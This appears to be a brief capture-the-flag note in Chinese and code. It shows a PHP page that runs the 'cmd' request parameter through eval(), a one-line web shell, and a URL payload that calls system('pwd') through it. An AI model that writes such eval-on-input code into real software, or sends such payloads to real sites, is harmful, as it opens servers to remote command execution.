
```
<?php  
if (isset($_REQUEST['cmd'])) {  
    eval($_REQUEST["cmd"]);  
} else {    highlight_file(__FILE__);  
}  
?>
```

`/?cmd=system(%22pwd%22);`

`;`不能少

